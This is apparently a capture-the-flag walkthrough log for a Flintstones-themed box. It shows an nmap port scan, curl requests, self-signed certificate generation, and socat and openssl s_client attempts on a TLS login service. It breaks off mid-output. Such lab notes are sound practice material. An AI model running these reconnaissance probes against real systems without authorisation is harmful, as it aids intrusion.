[ terra2 ~ ]# nmap -Pn -p- -sC -sV -T5 -A -v ip
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-28 18:39 UTC
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 18:39
Completed Parallel DNS resolution of 1 host. at 18:39, 0.04s elapsed
Initiating SYN Stealth Scan at 18:39
Scanning ip [65535 ports]
Discovered open port 80/tcp on ip
Discovered open port 22/tcp on ip
Warning: ip giving up on port because retransmission cap hit (2).
SYN Stealth Scan Timing: About 19.33% done; ETC: 18:42 (0:02:09 remaining)
Stats: 0:00:33 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 21.56% done; ETC: 18:42 (0:02:00 remaining)
Discovered open port 4040/tcp on ip
SYN Stealth Scan Timing: About 55.89% done; ETC: 18:41 (0:00:50 remaining)
Discovered open port 54321/tcp on ip
Discovered open port 9009/tcp on ip
Completed SYN Stealth Scan at 18:41, 109.64s elapsed (65535 total ports)
Initiating Service scan at 18:41
Scanning 5 services on ip
Completed Service scan at 18:44, 158.00s elapsed (5 services on 1 host)
Initiating OS detection (try #1) against ip
Retrying OS detection (try #2) against ip
Initiating Traceroute at 18:44
Completed Traceroute at 18:44, 0.13s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 18:44
Completed Parallel DNS resolution of 2 hosts. at 18:44, 0.02s elapsed
NSE: Script scanning ip.
Initiating NSE at 18:44
Completed NSE at 18:44, 1.42s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 1.60s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 0.00s elapsed
Nmap scan report for ip
Host is up (0.060s latency).
Not shown: 65530 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
|_  256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ip:4040/
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
4040/tcp  open  ssl/yo-main?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sun, 28 Aug 2022 18:41:48 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-28T18:38:15
| Not valid after:  2023-08-28T18:38:15
| MD5:   0c22 bb4e fc90 e17a d71a 5719 2188 8693
|_SHA-1: ed06 812c b240 0995 3bf0 c152 d39b 0125 8101 b93c
|_ssl-date: TLS randomness does not represent time
9009/tcp  open  pichat?
| fingerprint-strings:
|   NULL:
|     ____ _____
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | |
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| |
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe:
|_    Error: 'undefined' is not authorized for access.
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-08-28T18:38:15
| Not valid after:  2023-08-28T18:38:15
| MD5:   0c22 bb4e fc90 e17a d71a 5719 2188 8693
|_SHA-1: ed06 812c b240 0995 3bf0 c152 d39b 0125 8101 b93c
|_ssl-date: TLS randomness does not represent time
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.92%T=SSL%I=7%D=8/28%Time=630BB6ED%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Sun,\x2028\x20Aug\x202022\x2018:41:48\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Sun,\x2028\x20Aug\x202022\x2018:41:48\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.92%I=7%D=8/28%Time=630BB6DC%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port54321-TCP:V=7.92%T=SSL%I=7%D=8/28%Time=630BB6E2%P=x86_64-pc-linux-g
SF:nu%r(NULL,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x
SF:20access\.\n")%r(GenericLines,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(GetRequest,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(HTTPOptions,31,"
SF:Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")
SF:%r(RTSPRequest,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(RPCCheck,31,"Error:\x20'undefined'\x20is\x20not\x
SF:20authorized\x20for\x20access\.\n")%r(DNSVersionBindReqTCP,31,"Error:\x
SF:20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(DNSSt
SF:atusRequestTCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20
SF:for\x20access\.\n")%r(Help,31,"Error:\x20'undefined'\x20is\x20not\x20au
SF:thorized\x20for\x20access\.\n")%r(SSLSessionReq,31,"Error:\x20'undefine
SF:d'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServerCo
SF:okie,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(TLSSessionReq,31,"Error:\x20'undefined'\x20is\x20not\x20aut
SF:horized\x20for\x20access\.\n")%r(Kerberos,31,"Error:\x20'undefined'\x20
SF:is\x20not\x20authorized\x20for\x20access\.\n")%r(SMBProgNeg,31,"Error:\
SF:x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(X11P
SF:robe,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acc
SF:ess\.\n")%r(FourOhFourRequest,31,"Error:\x20'undefined'\x20is\x20not\x2
SF:0authorized\x20for\x20access\.\n")%r(LPDString,31,"Error:\x20'undefined
SF:'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(LDAPSearchReq,31,
SF:"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20access\.\n"
SF:)%r(LDAPBindReq,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x2
SF:0for\x20access\.\n")%r(SIPOptions,31,"Error:\x20'undefined'\x20is\x20no
SF:t\x20authorized\x20for\x20access\.\n")%r(LANDesk-RC,31,"Error:\x20'unde
SF:fined'\x20is\x20not\x20authorized\x20for\x20access\.\n")%r(TerminalServ
SF:er,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20for\x20acces
SF:s\.\n")%r(NCP,31,"Error:\x20'undefined'\x20is\x20not\x20authorized\x20f
SF:or\x20access\.\n");
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Sony X75CH-series Android TV (Android 5.0) (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%), QNAP QTS 4.0 - 4.2 (92%), Linux 2.6.32 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 1.370 days (since Sat Aug 27 09:51:24 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=246 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT       ADDRESS
1   118.75 ms other ip
2   118.79 ms ip

NSE: Script Post-scanning.
Initiating NSE at 18:44
Completed NSE at 18:44, 0.00s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 0.00s elapsed
Initiating NSE at 18:44
Completed NSE at 18:44, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 276.42 seconds
           Raw packets sent: 73891 (3.253MB) | Rcvd: 139353 (5.578MB)
           
[ terra2 ~ ]# curl -k https://ip:4040
<!DOCTYPE html>
<html>
  <head>
    <title>ABC</title>
    <style>
      body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
      }
    </style>
  </head>

  <body>
    <h1>Welcome to ABC!</h1>
    <p>Abbadabba Broadcasting Compandy</p>

    <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>

    <p>Barney is helping to setup the server, and he said this info was important...</p>

<pre>
Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
Bamm Bamm tried to setup a sql database, but I don't see it running.
Looks like it started something else, but I'm not sure how to turn it off...

He said it was from the toilet and OVER 9000!

Need to try and secure connections with certificates...

</pre>
  </body>
</html>

nothing of interest yet except the Abbadabba name. i mean why isn't it name yabbadabba???

[ terra2 ~/b3dr0ck ]# curl -k --http0.9 https://ip:54321
Error: 'undefined' is not authorized for access.


but in the browser it looks like this:
 __     __   _     _             _____        _     _             _____        _
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)



Welcome: 'undefined' is authorized.
b3dr0ck> Unrecognized command: 'GET / HTTP/1.1
Host: ip:54321
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Cache-Control: max-age=0'

This service is for login and password hints
b3dr0ck>

this is interesting so we propably just need to establish a tcp connection to port 54321 and wrap it with tls
not sure why this worked anyway, when I tried to generate a custom cert and login with it I was not authorized:

#http://www.dest-unreach.org/socat/doc/socat-openssltunnel.html
[ terra2 ~/b3dr0ck ]# FILENAME=server
[ terra2 ~/b3dr0ck ]# openssl genrsa -out $FILENAME.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
...+++++
.................................................................................+++++
e is 65537 (0x010001)
[ terra2 ~/b3dr0ck ]# openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:DE
State or Province Name (full name) [Some-State]:lol
Locality Name (eg, city) []:lol
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Terra
Organizational Unit Name (eg, section) []:lol
Common Name (e.g. server FQDN or YOUR name) []:Terraminator
Email Address []:lol@lol.com
[ terra2 ~/b3dr0ck ]# cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
[ terra2 ~/b3dr0ck ]# chmod 600 $FILENAME.key $FILENAME.pem


[ terra2 ~/b3dr0ck ]# FILENAME=client
[ terra2 ~/b3dr0ck ]# openssl genrsa -out $FILENAME.key 2048
Generating RSA private key, 2048 bit long modulus (2 primes)
.............................................+++++
........................+++++
e is 65537 (0x010001)
[ terra2 ~/b3dr0ck ]# openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:DE
State or Province Name (full name) [Some-State]:lol
Locality Name (eg, city) []:lol
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Terra
Organizational Unit Name (eg, section) []:lol
Common Name (e.g. server FQDN or YOUR name) []:Terraminator
Email Address []:lol@lol.com
[ terra2 ~/b3dr0ck ]# cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
[ terra2 ~/b3dr0ck ]# chmod 600 $FILENAME.key $FILENAME.pem

socat stdio openssl-connect:ip:54321,openssl-commonname=socatssl,cert=/root/b3dr0ck/client.pem,cafile=/root/b3dr0ck/server.crt,verify=0
Error: 'Terraminator' is not authorized for access.
rm *.key
rm *.crt
rm *.pem

[ terra2 ~/b3dr0ck ]# openssl s_client -connect ip:54321 -ciphersuites TLS_AES_128_GCM_SHA256
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
---
Server certificate
-----BEGIN CERTIFICATE-----
MIICrzCCAZcCFAt9WaQoaMw/TS0ejHAA6PPEFBgAMA0GCSqGSIb3DQEBCwUAMBQx
EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yMjA4MjkwODM3MzZaFw0yMzA4MjkwODM3
MzZaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
ADCCAQoCggEBANgr+st0wEMGvgyREeADUrlryO9nP5zv9umY3DAmjzBZMFxUVl+a
D0/2K0UMItX2Am4E4TSGpQwfBNF1crMVGmJz5ccY0gGf9HPbkKD20d8PmWEFtjw5
Z4ZjFwN3SwAFE5+WEEPH6ybCZ7WyoZAnYyFzUOTvaRHp9pCCImXQ9nPxqQo+r7Q8
R70usU6s8fIsy7oO8IX2t3k6npLxp/N+jUgmBaeKiy0RbHgz+RtKkW/AGUT0cuCl
dRjXCt4AcvnXR91fZnm7vPWDbgSwMvJnHihE/O3kz3K+52cFdy1cHXZyW1og9ATX
HBiLoGpGjlFkfjkzOY77aR9ebHZWB1fMp80CAwEAATANBgkqhkiG9w0BAQsFAAOC
AQEAe250EY7ZpM9OPG+uZ1DItM5/4MN+p5Wg5XP8E11PqIjwok+C67vaj/AUe4LU
P+aNvl5fn4SVebJhGRmcP+UxlydM3Ntjmoxe2aqgSJIspz3MvR8JlgfJDv2HJuWw
OBpxLHCZnMKJxmavlud7MNBUiQo/wO5iBJFWvCHSNJ2i20TP4pQfVtuudrCn5OiG
5zjNYbpi8gc6fe6qGXoMJ6seIEm/SvH+WZXG1baBHFXDjDgDGMuZDcqIrZ0ZlEe8
bDNEOXSfm5o8T3yDqgCbzoGpWKPDjKgQOin5sBnWmyrJ9CamuYmVX6xD/5Tyzv6z
GGhFvuFKRWYBhCsNXQGCwEoUHw==
-----END CERTIFICATE-----
subject=CN = localhost

issuer=CN = localhost

---
Acceptable client certificate CA names
CN = localhost
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Shared Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512
Peer signing digest: SHA256
Peer signature type: RSA-PSS
Server Temp Key: X25519, 253 bits
---
SSL handshake has read 1332 bytes and written 383 bytes
Verification error: self signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_128_GCM_SHA256
Server public key is 2048 bit
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self signed certificate)
---
Error: 'undefined' is not authorized for access.
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_128_GCM_SHA256
    Session-ID: 90186F022242A0F8CCD3EDEDBA062B09C65E5D8B3DA40D9F89F3CDC9C54CDB0A
    Session-ID-ctx:
    Resumption PSK: 5789D2E44530130D150964BEC86621EB3C20FB62BCAED44317FA7807D51D9B81
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 3a 77 21 dd 7f 22 1f c2-ce 2a c0 bc 39 db b8 87   :w!.."...*..9...
    0010 - ee 80 17 f6 a7 c7 25 f9-de 2e 8c 62 bf 18 06 08   ......%....b....
    0020 - 62 47 b7 b8 58 bd f6 08-1f 20 35 93 e5 76 1e e0   bG..X.... 5..v..
    0030 - 7d cf dd ba 41 32 ec d4-c1 e6 e1 37 3d 9a ca e8   }...A2.....7=...
    0040 - df 0c fb 39 81 03 a6 72-83 c4 2a d8 ff dc 3d 40   ...9...r..*...=@
    0050 - 50 88 90 c2 a0 4a 52 f1-f1 ac 3f fb 05 50 ba 57   P....JR...?..P.W
    0060 - 62 f4 39 99 51 35 b5 78-eb 9c d2 95 9d f4 ec f1   b.9.Q5.x........
    0070 - 70 83 14 95 0b b6 5f f8-6b d7 03 a9 62 28 ad af   p....._.k...b(..
    0080 - 4f e1 bb 2e 6d fa bf 9b-47 71 d3 d3 e5 54 9e d1   O...m...Gq...T..
    0090 - fc b0 13 f9 86 33 5f 07-e9 13 69 53 a4 f2 5f 2a   .....3_...iS.._*
    00a0 - 64 7f 00 1d dd b4 89 7b-5e 60 a3 ca 40 88 71 c3   d......{^`..@.q.
    00b0 - ed df 9d 0f 47 d6 7e 2e-e9 35 b5 44 aa 12 7e a3   ....G.~..5.D..~.
    00c0 - 39 51 20 4d ff c4 30 a3-4c 3a cd 4b d2 ac 0f d6   9Q M..0.L:.K....

    Start Time: 1661764824
    Timeout   : 7200 (sec)
    Verify return code: 18 (self signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_128_GCM_SHA256
    Session-ID: CB27CA30A9661DA19A85298CE9903CE8ACDA2B27BADDEE56F210F69282ACDDED
    Session-ID-ctx:
    Resumption PSK: B1A86B394198C676282E94490EA520C8B30DA9F3CB12376BED8DEE0474C0AD9E
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 7200 (seconds)
    TLS session ticket:
    0000 - 3a 77 21 dd 7f 22 1f c2-ce 2a c0 bc 39 db b8 87   :w!.."...*..9...
    0010 - 45 2d 2b 88 79 6d 68 6a-5f 59 25 66 a6 62 c3 16   E-+.ymhj_Y%f.b..
    0020 - 6c 9b b9 8c 0f 29 77 11-8e 96 dc 21 17 93 46 d6   l....)w....!..F.
    0030 - 5e 06 9b 5a 71 2a 22 e4-67 1f 4c 4e 20 2e d0 af   ^..Zq*".g.LN ...
    0040 - b8 bc 49 73 ae 7a 1e aa-bb 62 93 d6 66 07 b6 9c   ..Is.z...b..f...
    0050 - bb e4 0d 44 57 89 58 7e-d5 1b c3 64 3f 7f 1f 59   ...DW.X~...d?..Y
    0060 - f2 ce 3a 37 33 a6 40 df-bf 4f 14 89 1f fb f1 64   ..:73.@..O.....d
    0070 - b9 b7 22 a6 0d 60 1c 00-cd 4e 0e 5f e2 8f 07 b1   .."..`...N._....
    0080 - f5 2d 57 b4 d7 be 39 8e-39 01 ee bd 1b eb 44 e0   .-W...9.9.....D.
    0090 - d9 8d 2a dd 32 3d 91 df-e1 e9 d7 51 de 4b ba 32   ..*.2=.....Q.K.2
    00a0 - 76 ab 4e af 89 cd c2 bd-f8 e0 f3 c2 cb 26 cf f7   v.N..........&..
